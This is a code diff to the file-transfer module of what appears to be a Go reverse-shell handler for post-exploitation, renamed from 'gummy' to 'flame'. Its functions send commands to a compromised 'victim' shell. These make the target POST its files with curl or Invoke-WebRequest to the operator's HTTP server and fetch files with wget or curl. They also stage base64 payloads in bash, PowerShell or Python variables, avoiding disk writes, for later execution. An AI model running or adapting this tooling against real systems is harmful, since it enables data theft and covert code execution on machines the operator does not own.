@@ -13,14 +13,106 @@ import (
 	"strings"
 	"time"
 
-	"github.com/chsoares/gummy/internal/ui"
+	"github.com/chsoares/flame/internal/ui"
 )
 
 // Transferer handles file upload/download operations
 type Transferer struct {
-	conn      net.Conn
-	sessionID string
-	platform  string // "windows", "linux", or "unknown"
+	conn        net.Conn
+	sessionID   string
+	platform    string       // "windows", "linux", or "unknown"
+	progressFn  func(string) // Optional callback for progress updates (TUI mode)
+	ptyUpgraded bool         // Use smaller chunks for PTY-upgraded shells
+}
+
+func buildWindowsHTTPUploadCommand(url, remotePath, marker string) string {
+	escapedPath := strings.ReplaceAll(remotePath, "'", "''")
+	return fmt.Sprintf("$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%s' -OutFile '%s'; Write-Output '%s' } catch { Write-Output 'FLAME_HTTP_ERROR'; Write-Output $_ }\r\n", url, escapedPath, marker)
+}
+
+func buildWindowsBase64DecodeCommand(remotePath string) string {
+	escapedPath := strings.ReplaceAll(remotePath, "'", "''")
+	return fmt.Sprintf("$b64 = Get-Content '%s.b64' -Raw; [IO.File]::WriteAllBytes('%s', [Convert]::FromBase64String($b64)); Remove-Item '%s.b64' -Force\r\n", escapedPath, escapedPath, escapedPath)
+}
+
+func waitForRemoteMarker(ctx context.Context, conn net.Conn, marker string) error {
+	buffer := make([]byte, 4096)
+	var output strings.Builder
+	for {
+		select {
+		case <-ctx.Done():
+			conn.SetReadDeadline(time.Time{})
+			return ctx.Err()
+		default:
+		}
+
+		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
+		n, err := conn.Read(buffer)
+		if n > 0 {
+			output.Write(buffer[:n])
+			text := output.String()
+			if strings.Contains(text, marker) {
+				conn.SetReadDeadline(time.Time{})
+				if strings.Contains(text, "FLAME_HTTP_ERROR") {
+					return fmt.Errorf("remote HTTP upload command failed")
+				}
+				return nil
+			}
+		}
+		if err != nil {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				continue
+			}
+			conn.SetReadDeadline(time.Time{})
+			return err
+		}
+	}
+}
+
+func (fs *FileServer) listenForTransfer(filename string) (chan TransferProgress, func()) {
+	ch := make(chan TransferProgress, 10)
+	fs.listenerMu.Lock()
+	fs.transferListeners[filename] = ch
+	fs.listenerMu.Unlock()
+	cleanup := func() {
+		fs.listenerMu.Lock()
+		delete(fs.transferListeners, filename)
+		fs.listenerMu.Unlock()
+	}
+	return ch, cleanup
+}
+
+func (fs *FileServer) waitOnTransferChannel(ctx context.Context, ch chan TransferProgress, cleanup func(), inactivityTimeout time.Duration, progressCallback func(TransferProgress)) error {
+	timer := time.NewTimer(inactivityTimeout)
+	defer timer.Stop()
+	for {
+		select {
+		case <-ctx.Done():
+			cleanup()
+			return ctx.Err()
+		case progress := <-ch:
+			if !timer.Stop() {
+				select {
+				case <-timer.C:
+				default:
+				}
+			}
+			timer.Reset(inactivityTimeout)
+			if progressCallback != nil {
+				progressCallback(progress)
+			}
+			if progress.Done {
+				cleanup()
+				if progress.Success {
+					return nil
+				}
+				return fmt.Errorf("transfer failed")
+			}
+		case <-timer.C:
+			cleanup()
+			return fmt.Errorf("transfer timeout")
+		}
+	}
 }
 
 // TransferConfig holds transfer configuration
@@ -51,6 +143,35 @@ func (t *Transferer) SetPlatform(platform string) {
 	t.platform = platform
 }
 
+// progress reports a progress update via callback (TUI) or spinner (CLI).
+func (t *Transferer) progress(text string) {
+	if t.progressFn != nil {
+		t.progressFn(text)
+	}
+}
+
+func displayTransferName(path string) string {
+	name := filepath.Base(path)
+	if strings.HasPrefix(name, "tmp_") {
+		return strings.TrimPrefix(name, "tmp_")
+	}
+	return name
+}
+
+func effectiveUploadRemotePath(localPath, remotePath string) string {
+	if remotePath != "" {
+		return remotePath
+	}
+	return displayTransferName(localPath)
+}
+
+// done prints a final message via stdout (CLI only — TUI uses doneFn callback).
+func (t *Transferer) done(text string) {
+	if t.progressFn == nil {
+		fmt.Println(text)
+	}
+}
+
 // Upload sends a local file to the remote system
 // localPath: path to local file
 // remotePath: destination path on remote system (if empty, uses filename in remote cwd)
@@ -63,16 +184,19 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	}
 
 	// If remotePath is empty, use just the filename (will go to remote cwd)
-	if remotePath == "" {
-		remotePath = filepath.Base(localPath)
-	}
+	remotePath = effectiveUploadRemotePath(localPath, remotePath)
 
 	fileSize := len(data)
 
-	// Start spinner
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Uploading %s... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
-	defer spinner.Stop() // Ensure cleanup on error paths
+	// Progress reporting: use callback (TUI) or spinner (CLI)
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Uploading %s... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Uploading %s... 0 B / %s", filepath.Base(localPath), formatSize(fileSize)))
+	}
 
 	// Drain leftover data from previous shell interactions
 	t.drainConnection()
@@ -87,10 +211,10 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	// Send file in chunks
 	config := DefaultTransferConfig()
 
-	// Platform-specific chunk sizes
+	// Chunk size: smaller for Windows and PTY-upgraded shells (PTY buffer limits)
 	chunkSize := config.ChunkSize
-	if t.platform == "windows" {
-		chunkSize = 1024 // 1KB chunks for Windows (safe from quote escaping issues)
+	if t.platform == "windows" || t.ptyUpgraded {
+		chunkSize = 1024 // 1KB chunks — safe for PTY buffers and Windows
 	}
 	chunks := splitIntoChunks(encoded, chunkSize)
 
@@ -146,11 +270,10 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 		}
 
 		// Small sleep to avoid overwhelming the shell
-		// Optimized for speed while maintaining stability
-		if t.platform == "windows" {
-			time.Sleep(15 * time.Millisecond) // Windows: 1KB every 15ms = ~67KB/s
+		if t.platform == "windows" || t.ptyUpgraded {
+			time.Sleep(15 * time.Millisecond) // 1KB every 15ms = ~67KB/s (safe for PTY/Windows)
 		} else {
-			time.Sleep(5 * time.Millisecond) // Linux: 32KB every 5ms = ~6.4MB/s
+			time.Sleep(5 * time.Millisecond) // 32KB every 5ms = ~6.4MB/s (raw shell)
 		}
 
 		bytesSent += len(chunk)
@@ -162,21 +285,24 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 		}
 		percent := int(float64(actualBytes) / float64(fileSize) * 100)
 
-		// Update spinner every 50 chunks or on last chunk
+		// Update progress every 50 chunks or on last chunk
 		if i%50 == 0 || i == len(chunks)-1 {
-			spinner.Update(fmt.Sprintf("Uploading %s... %s / %s (%d%s)",
-				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
+			msg := fmt.Sprintf("Uploading %s... %s / %s (%d%s)",
+				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%")
+			if spinner != nil {
+				spinner.Update(msg)
+			} else {
+				t.progress(msg)
+			}
 		}
 
-		// Drain buffer to prevent overflow (platform-specific timing)
-		if t.platform == "windows" {
-			// Windows PowerShell: drain every 10 chunks (more frequent, same as UploadToPowerShellVariable)
+		// Drain buffer to prevent overflow
+		if t.platform == "windows" || t.ptyUpgraded {
 			if i%10 == 0 && i > 0 {
 				time.Sleep(150 * time.Millisecond)
 				t.drainConnection()
 			}
 		} else {
-			// Linux: drain every 25 chunks
 			if i%25 == 0 && i > 0 {
 				time.Sleep(100 * time.Millisecond)
 				t.drainConnection()
@@ -188,8 +314,7 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	var decodeCmd string
 	if t.platform == "windows" {
 		// PowerShell: Read base64 from file, decode to bytes, write to final file, cleanup
-		escapedPath := strings.ReplaceAll(remotePath, "'", "''")
-		decodeCmd = fmt.Sprintf("$b64 = Get-Content '%s.b64' -Raw; [IO.File]::WriteAllBytes((Resolve-Path '.').Path+'\\%s', [Convert]::FromBase64String($b64)); Remove-Item '%s.b64' -Force\r\n", escapedPath, escapedPath, escapedPath)
+		decodeCmd = buildWindowsBase64DecodeCommand(remotePath)
 	} else {
 		// Linux/Unix: Decode from temp file
 		decodeCmd = fmt.Sprintf("base64 -d %s.b64 > %s && rm %s.b64\n", remotePath, remotePath, remotePath)
@@ -201,14 +326,12 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	t.drainConnection()
 
 	// Verify checksum with markers (platform-specific)
-	marker := "GUMMY_MD5_START"
-	endMarker := "GUMMY_MD5_END"
+	marker := "FLAME_MD5_START"
+	endMarker := "FLAME_MD5_END"
 	var checksumCmd string
 	if t.platform == "windows" {
-		// PowerShell: Calculate MD5 hash
 		checksumCmd = fmt.Sprintf("echo %s; (Get-FileHash '%s' -Algorithm MD5).Hash.ToLower(); echo %s", marker, remotePath, endMarker)
 	} else {
-		// Linux/Unix
 		checksumCmd = fmt.Sprintf("echo %s; md5sum %s 2>/dev/null | awk '{print $1}'; echo %s", marker, remotePath, endMarker)
 	}
 	t.conn.Write([]byte(checksumCmd + "\r\n"))
@@ -240,15 +363,16 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	if startIdx != -1 {
 		endIdx := strings.Index(fullOutput[startIdx:], endMarker)
 		if endIdx != -1 {
-			content := fullOutput[startIdx+len(marker):startIdx+endIdx]
+			content := fullOutput[startIdx+len(marker) : startIdx+endIdx]
 			lines := strings.Split(content, "\n")
 			for _, line := range lines {
 				line = strings.TrimSpace(line)
 				if len(line) == 32 && isHex(line) {
 					if line == checksum {
-						spinner.Stop()
-						fmt.Println(ui.Success(fmt.Sprintf("Upload complete! (MD5: %s)", checksum[:8])))
-						// Don't drain here - let shell handler read naturally to avoid eating user input
+						if spinner != nil {
+							spinner.Stop()
+						}
+						t.done(ui.Success(fmt.Sprintf("Upload complete! (MD5: %s)", checksum[:8])))
 						return nil
 					}
 				}
@@ -257,18 +381,19 @@ func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) e
 	}
 
 	// Fallback if MD5 check failed
-	spinner.Stop()
-	fmt.Println(ui.Success("Upload complete!"))
-	// Don't drain here - let shell handler read naturally to avoid eating user input
+	if spinner != nil {
+		spinner.Stop()
+	}
+	t.done(ui.Success("Upload complete!"))
 	return nil
 }
 
 // UploadToVariable sends file content to a bash variable (in-memory, no disk write on victim)
 // localPath: path to local file
-// varName: bash variable name to store content (e.g., "_gummy_script")
+// varName: bash variable name to store content (e.g., "_flame_script")
 // Returns the variable name for later use (e.g., echo "$varName" | base64 -d | bash)
 // UploadToBashVariable uploads a file to a bash variable (in-memory, no disk write on victim)
-// This is used for stealthy script execution - the variable contains base64-encoded data
+// The variable contains base64-encoded data for later execution
 func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varName string) error {
 	// Read local file
 	data, err := os.ReadFile(localPath)
@@ -353,7 +478,6 @@ func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varNam
 }
 
 // UploadToPowerShellVariable uploads a file to a PowerShell variable (in-memory, no disk write on victim)
-// This is used for stealthy script/assembly execution on Windows
 func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, varName string) error {
 	// Read local file
 	data, err := os.ReadFile(localPath)
@@ -436,7 +560,6 @@ func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, 
 }
 
 // UploadToPythonVariable uploads a file to a Python variable (in-memory, no disk write on victim)
-// This is used for stealthy script execution via Python
 func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varName string) error {
 	// Read local file
 	data, err := os.ReadFile(localPath)
@@ -528,17 +651,22 @@ func (t *Transferer) Download(ctx context.Context, remotePath, localPath string)
 		localPath = filepath.Base(remotePath)
 	}
 
-	// Start spinner for download
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Downloading %s... 0 B", filepath.Base(remotePath)))
-	defer spinner.Stop()
+	// Progress reporting: use callback (TUI) or spinner (CLI)
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Downloading %s... 0 B", filepath.Base(remotePath)))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Downloading %s...", filepath.Base(remotePath)))
+	}
 
 	// Drain leftover data from previous shell interactions
 	t.drainConnection()
 
 	// Use unique markers
-	marker := "GUMMY_B64_START"
-	endMarker := "GUMMY_B64_END"
+	marker := "FLAME_B64_START"
+	endMarker := "FLAME_B64_END"
 
 	// Send command with markers (platform-specific)
 	var cmd string
@@ -581,9 +709,14 @@ func (t *Transferer) Download(ctx context.Context, remotePath, localPath string)
 			output.WriteString(string(buffer[:n]))
 			totalBytes += n
 
-			// Update spinner every 100KB to avoid spam
+			// Update progress every 100KB to avoid spam
 			if totalBytes-lastProgressUpdate >= 100*1024 {
-				spinner.Update(fmt.Sprintf("Downloading %s... %s", filepath.Base(remotePath), formatSize(totalBytes)))
+				msg := fmt.Sprintf("Downloading %s... %s", filepath.Base(remotePath), formatSize(totalBytes))
+				if spinner != nil {
+					spinner.Update(msg)
+				} else {
+					t.progress(msg)
+				}
 				lastProgressUpdate = totalBytes
 			}
 
@@ -616,7 +749,7 @@ func (t *Transferer) Download(ctx context.Context, remotePath, localPath string)
 	endIdx += startIdx
 
 	// Extract base64 content
-	content := fullOutput[startIdx+len(marker):endIdx]
+	content := fullOutput[startIdx+len(marker) : endIdx]
 
 	// Clean and join base64 lines
 	lines := strings.Split(content, "\n")
@@ -649,12 +782,85 @@ func (t *Transferer) Download(ctx context.Context, remotePath, localPath string)
 	hash := md5.Sum(decoded)
 	checksum := hex.EncodeToString(hash[:])
 
-	spinner.Stop()
-	fmt.Println(ui.Success(fmt.Sprintf("Download complete! Saved to: %s (%s, MD5: %s)",
+	if spinner != nil {
+		spinner.Stop()
+	}
+	t.done(ui.Success(fmt.Sprintf("Download complete! Saved to: %s (%s, MD5: %s)",
 		localPath, formatSize(len(decoded)), checksum[:8])))
 
-	// Don't drain here - let shell handler read naturally to avoid eating user input
 	return nil
+}
+
+// SmartDownload downloads a file using HTTP POST (if binbag enabled) or b64 as fallback
+func (t *Transferer) SmartDownload(ctx context.Context, remotePath, localPath string) error {
+	if GlobalRuntimeConfig.BinbagEnabled && GlobalRuntimeConfig.FileServer != nil {
+		if err := t.downloadViaHTTP(ctx, remotePath, localPath); err == nil {
+			return nil
+		}
+		// HTTP failed, fallback
+		t.done(ui.Warning("HTTP download failed, falling back to base64..."))
+	}
+	return t.Download(ctx, remotePath, localPath)
+}
+
+// downloadViaHTTP tells the remote to POST the file to our HTTP server
+func (t *Transferer) downloadViaHTTP(ctx context.Context, remotePath, localPath string) error {
+	filename := filepath.Base(remotePath)
+	if localPath != "" {
+		filename = filepath.Base(localPath)
+	}
+	displayName := filename
+
+	// Build URL for the remote to POST to
+	url := GlobalRuntimeConfig.GetHTTPURL(filename)
+
+	// Platform-specific POST command
+	var postCmd string
+	if t.platform == "windows" {
+		postCmd = fmt.Sprintf("Invoke-WebRequest -Uri '%s' -Method POST -InFile '%s'\r\n", url, remotePath)
+	} else {
+		postCmd = fmt.Sprintf("curl -s -X POST --data-binary @'%s' '%s'\n", remotePath, url)
+	}
+
+	// Get file size for progress (optional — remote file size unknown to us)
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Downloading %s via HTTP...", displayName))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Downloading %s via HTTP...", displayName))
+	}
+
+	// Send POST command to remote
+	if _, err := t.conn.Write([]byte(postCmd)); err != nil {
+		return fmt.Errorf("failed to send download command: %w", err)
+	}
+
+	// Wait for HTTP server to receive the file
+	if GlobalRuntimeConfig.FileServer != nil {
+		err := GlobalRuntimeConfig.FileServer.WaitForTransferCtx(ctx, filename, 10*time.Second, func(progress TransferProgress) {
+			if !progress.Done {
+				msg := fmt.Sprintf("Downloading %s via HTTP... %s",
+					displayName, formatSize(int(progress.BytesTransferred)))
+				if spinner != nil {
+					spinner.Update(msg)
+				} else {
+					t.progress(msg)
+				}
+			}
+		})
+		if spinner != nil {
+			spinner.Stop()
+		}
+		if err != nil {
+			return err
+		}
+		t.done(ui.Success(fmt.Sprintf("Download complete! Saved to: %s", displayName)))
+		return nil
+	}
+
+	return fmt.Errorf("file server not available")
 }
 
 // drainConnection drains any pending data from connection
@@ -808,8 +1014,8 @@ func (t *Transferer) SmartUpload(ctx context.Context, source, remotePath string)
 		if err := t.uploadViaHTTP(ctx, localPath, remotePath); err == nil {
 			return nil // Success via HTTP!
 		}
-		// HTTP failed, log and fallback to chunks
-		fmt.Println(ui.Warning("HTTP upload failed, falling back to base64 chunks..."))
+		// HTTP failed, fallback to chunks
+		t.done(ui.Warning("HTTP upload failed, falling back to base64 chunks..."))
 	}
 
 	// Step 3: Fallback to b64 chunks (always works)
@@ -830,11 +1036,11 @@ func (t *Transferer) resolveSource(source string) (string, func(), error) {
 			tmpPath = filepath.Join(GlobalRuntimeConfig.BinbagPath, "tmp_"+filename)
 		} else {
 			// Binbag disabled: download to /tmp for local use
-			tmpPath = filepath.Join("/tmp", "gummy_"+filename)
+			tmpPath = filepath.Join("/tmp", "flame_"+filename)
 		}
 
 		// Download file
-		if err := DownloadFile(context.Background(), source, tmpPath); err != nil {
+		if err := DownloadFileQuiet(context.Background(), source, tmpPath, filename); err != nil {
 			return "", nil, fmt.Errorf("failed to download URL: %w", err)
 		}
 
@@ -845,19 +1051,10 @@ func (t *Transferer) resolveSource(source string) (string, func(), error) {
 		return tmpPath, cleanup, nil
 	}
 
-	// Case 2: Check binbag first (if enabled)
-	if GlobalRuntimeConfig.BinbagEnabled {
-		binbagFile := filepath.Join(GlobalRuntimeConfig.BinbagPath, source)
-		if _, statErr := os.Stat(binbagFile); statErr == nil {
-			return binbagFile, nil, nil // File exists in binbag!
-		} else {
-		}
-	}
-
-	// Case 3: Local file path
+	// Case 2: Local file path (check CWD first)
 	if _, err := os.Stat(source); err == nil {
-		// If binbag enabled, copy to binbag as tmp_*
-		if GlobalRuntimeConfig.BinbagEnabled {
+		// If binbag enabled, copy to binbag as tmp_* so HTTP server can serve it
+		if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
 			filename := filepath.Base(source)
 			tmpPath := filepath.Join(GlobalRuntimeConfig.BinbagPath, "tmp_"+filename)
 
@@ -881,6 +1078,14 @@ func (t *Transferer) resolveSource(source string) (string, func(), error) {
 		return source, nil, nil
 	}
 
+	// Case 3: Check binbag directory (if enabled)
+	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
+		binbagFile := filepath.Join(GlobalRuntimeConfig.BinbagPath, source)
+		if _, statErr := os.Stat(binbagFile); statErr == nil {
+			return binbagFile, nil, nil // File exists in binbag!
+		}
+	}
+
 	return "", nil, fmt.Errorf("file not found: %s", source)
 }
 
@@ -892,20 +1097,21 @@ func (t *Transferer) uploadViaHTTP(ctx context.Context, localPath, remotePath st
 	}
 
 	filename := filepath.Base(localPath)
+	displayName := displayTransferName(localPath)
 
 	// If remotePath is empty, use filename in current directory
-	if remotePath == "" {
-		remotePath = filename
-	}
+	remotePath = effectiveUploadRemotePath(localPath, remotePath)
 
 	// Get HTTP URL (with pivot if configured)
 	url := GlobalRuntimeConfig.GetHTTPURL(filename)
 
 	// Platform-specific download command
 	var downloadCmd string
+	marker := ""
 	if t.platform == "windows" {
-		// PowerShell: Invoke-WebRequest (wget alias)
-		downloadCmd = fmt.Sprintf("Invoke-WebRequest -Uri '%s' -OutFile '%s'\r\n", url, remotePath)
+		marker = fmt.Sprintf("FLAME_HTTP_DONE_%d", time.Now().UnixNano())
+		downloadCmd = buildWindowsHTTPUploadCommand(url, remotePath, marker)
+		defer func() { t.drainConnection() }()
 	} else {
 		// Linux: wget or curl
 		downloadCmd = fmt.Sprintf("wget -q '%s' -O '%s' || curl -s '%s' -o '%s'\r\n", url, remotePath, url, remotePath)
@@ -915,33 +1121,55 @@ func (t *Transferer) uploadViaHTTP(ctx context.Context, localPath, remotePath st
 	fileInfo, _ := os.Stat(localPath)
 	fileSize := fileInfo.Size()
 
-	// Start spinner
-	spinner := ui.NewSpinner()
-	spinner.Start(fmt.Sprintf("Uploading %s via HTTP... 0 B / %s", filepath.Base(localPath), formatSize(int(fileSize))))
-	defer spinner.Stop()
-
-	// Send download command
-	if _, err := t.conn.Write([]byte(downloadCmd)); err != nil {
-		return fmt.Errorf("failed to send download command: %w", err)
+	// Progress reporting
+	var spinner *ui.Spinner
+	if t.progressFn == nil {
+		spinner = ui.NewSpinner()
+		spinner.Start(fmt.Sprintf("Uploading %s via HTTP... 0 B / %s", displayName, formatSize(int(fileSize))))
+		defer spinner.Stop()
+	} else {
+		t.progress(fmt.Sprintf("Uploading %s via HTTP...", displayName))
 	}
 
-	// Wait for HTTP server to complete the transfer (10 seconds inactivity timeout)
 	if GlobalRuntimeConfig.FileServer != nil {
-		success := GlobalRuntimeConfig.FileServer.WaitForTransfer(filename, 10*time.Second, func(progress TransferProgress) {
-			if !progress.Done {
-				percent := int(float64(progress.BytesTransferred) / float64(progress.TotalBytes) * 100)
-				spinner.Update(fmt.Sprintf("Uploading %s via HTTP... %s / %s (%d%%)",
-					filepath.Base(localPath),
-					formatSize(int(progress.BytesTransferred)),
-					formatSize(int(progress.TotalBytes)),
-					percent))
-			}
-		})
-		spinner.Stop()
-		if !success {
-			return fmt.Errorf("HTTP transfer timeout or failed")
+		ch, cleanup := GlobalRuntimeConfig.FileServer.listenForTransfer(filename)
+		errCh := make(chan error, 1)
+		go func() {
+			errCh <- GlobalRuntimeConfig.FileServer.waitOnTransferChannel(ctx, ch, cleanup, 10*time.Second, func(progress TransferProgress) {
+				if !progress.Done {
+					percent := int(float64(progress.BytesTransferred) / float64(progress.TotalBytes) * 100)
+					msg := fmt.Sprintf("Uploading %s via HTTP... %s / %s (%d%%)",
+						displayName,
+						formatSize(int(progress.BytesTransferred)),
+						formatSize(int(progress.TotalBytes)),
+						percent)
+					if spinner != nil {
+						spinner.Update(msg)
+					} else {
+						t.progress(msg)
+					}
+				}
+			})
+		}()
+
+		// Send download command only after the HTTP listener is active
+		if _, err := t.conn.Write([]byte(downloadCmd)); err != nil {
+			return fmt.Errorf("failed to send download command: %w", err)
 		}
-		fmt.Println(ui.Success(fmt.Sprintf("Upload complete! (%s via HTTP)", formatSize(int(fileSize)))))
+
+		err := <-errCh
+		if spinner != nil {
+			spinner.Stop()
+		}
+		if err != nil {
+			return err
+		}
+		if t.platform == "windows" {
+			if err := waitForRemoteMarker(ctx, t.conn, marker); err != nil {
+				return err
+			}
+		}
+		t.done(ui.Success(fmt.Sprintf("Upload complete! (%s via HTTP)", formatSize(int(fileSize)))))
 		return nil
 	}
 
